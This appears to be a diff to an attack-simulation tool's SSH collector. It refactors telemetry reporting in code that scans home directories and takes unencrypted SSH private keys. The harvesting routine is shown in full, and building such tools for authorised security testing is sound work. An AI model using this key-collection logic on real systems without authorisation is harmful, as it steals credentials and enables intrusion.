@@ -7,15 +7,16 @@ from typing import Dict, Iterable
 from common.utils.attack_utils import ScanStatus
 from infection_monkey.telemetry.attack.t1005_telem import T1005Telem
 from infection_monkey.telemetry.attack.t1145_telem import T1145Telem
+from infection_monkey.telemetry.messengers.i_telemetry_messenger import ITelemetryMessenger
 
 logger = logging.getLogger(__name__)
 
 DEFAULT_DIRS = ["/.ssh/", "/"]
 
 
-def get_ssh_info() -> Iterable[Dict]:
+def get_ssh_info(telemetry_messenger: ITelemetryMessenger) -> Iterable[Dict]:
     home_dirs = _get_home_dirs()
-    ssh_info = _get_ssh_files(home_dirs)
+    ssh_info = _get_ssh_files(home_dirs, telemetry_messenger)
 
     return ssh_info
 
@@ -51,7 +52,9 @@ def _get_ssh_struct(name: str, home_dir: str) -> Dict:
     }
 
 
-def _get_ssh_files(usr_info: Iterable[Dict]) -> Iterable[Dict]:
+def _get_ssh_files(
+    usr_info: Iterable[Dict], telemetry_messenger: ITelemetryMessenger
+) -> Iterable[Dict]:
     for info in usr_info:
         path = info["home_dir"]
         for directory in DEFAULT_DIRS:
@@ -79,12 +82,16 @@ def _get_ssh_files(usr_info: Iterable[Dict]) -> Iterable[Dict]:
                                         if private_key.find("ENCRYPTED") == -1:
                                             info["private_key"] = private_key
                                             logger.info("Found private key in %s" % private)
-                                            T1005Telem(
-                                                ScanStatus.USED, "SSH key", "Path: %s" % private
-                                            ).send()
-                                            T1145Telem(
-                                                ScanStatus.USED, info["name"], info["home_dir"]
-                                            ).send()
+                                            telemetry_messenger.send_telemetry(
+                                                T1005Telem(
+                                                    ScanStatus.USED, "SSH key", "Path: %s" % private
+                                                )
+                                            )
+                                            telemetry_messenger.send_telemetry(
+                                                T1145Telem(
+                                                    ScanStatus.USED, info["name"], info["home_dir"]
+                                                )
+                                            )
                                         else:
                                             continue
                                 except (IOError, OSError):
